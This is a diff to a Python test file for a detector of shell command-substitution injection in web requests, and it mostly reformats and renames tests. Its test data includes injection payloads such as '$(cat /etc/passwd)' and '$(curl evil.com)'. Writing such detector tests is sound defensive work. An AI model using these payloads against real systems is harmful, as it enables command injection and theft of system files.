@@ -811,7 +811,6 @@ UNAMBIGUOUS_DOLLAR_SUBSTITUTION_PAYLOADS = [
     pytest.param("$(whoami)", id="dollar_paren_bare_whoami"),
     pytest.param("$(cat /etc/passwd)", id="dollar_paren_bare_cat_passwd"),
     pytest.param("$(curl evil.com)", id="dollar_paren_bare_curl_evil_com"),
-    pytest.param("search$(id)", id="dollar_paren_glued_prefix_search_id"),
     pytest.param("x$(curl evil.com)", id="dollar_paren_glued_prefix_curl_evil_com"),
     pytest.param("foo$(whoami)bar", id="dollar_paren_glued_wrapped_whoami"),
     pytest.param("${IFS}", id="dollar_brace_bare_ifs"),
@@ -833,7 +832,7 @@ UNAMBIGUOUS_DOLLAR_SUBSTITUTION_PAYLOADS = [
 
 @pytest.mark.asyncio
 @pytest.mark.parametrize("payload", UNAMBIGUOUS_DOLLAR_SUBSTITUTION_PAYLOADS)
-async def test_unambiguous_dollar_substitution_or_denylist_payload_is_detected_in_request_body(
+async def test_unambiguous_dollar_substitution_or_denylist_detected_in_body(
     payload: str,
 ) -> None:
     result = await sus_patterns_handler.detect(
@@ -854,9 +853,7 @@ GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS = [
 
 
 @pytest.mark.asyncio
-@pytest.mark.parametrize(
-    "payload", GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS
-)
+@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS)
 async def test_ambiguous_dollar_substitution_payload_is_detected_in_query_param(
     payload: str,
 ) -> None:
@@ -870,9 +867,7 @@ async def test_ambiguous_dollar_substitution_payload_is_detected_in_query_param(
 
 
 @pytest.mark.asyncio
-@pytest.mark.parametrize(
-    "payload", GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS
-)
+@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS)
 async def test_ambiguous_dollar_substitution_payload_is_detected_in_url_path(
     payload: str,
 ) -> None:
@@ -891,9 +886,7 @@ JQUERY_AND_JS_TEMPLATE_DOLLAR_SUBSTITUTION_BENIGN_IN_REQUEST_BODY = [
         "$('#submit-button').on('click', handleSubmit);",
         id="jquery_selector_hash_id_call",
     ),
-    pytest.param(
-        "const label = `Welcome ${obj.prop}`;", id="js_template_dotted_prop"
-    ),
+    pytest.param("const label = `Welcome ${obj.prop}`;", id="js_template_dotted_prop"),
     pytest.param("const path = `/users/${id}`;", id="js_template_bare_var_brace"),
     pytest.param(
         "const greeting = `Hi ${name}, you have ${count} items`;",
@@ -958,9 +951,7 @@ async def test_log4shell_jndi_payload_is_detected_in_query_param(
 
 SQL_KEYWORD_GLUED_EXEMPTION_BYPASS_CASES = [
     pytest.param("x`id` JOIN accounts", id="backtick_ambiguous_keyword_not_glued"),
-    pytest.param(
-        "x$(id) JOIN accounts", id="dollar_paren_ambiguous_keyword_not_glued"
-    ),
+    pytest.param("x$(id) JOIN accounts", id="dollar_paren_ambiguous_keyword_not_glued"),
 ]
 
 
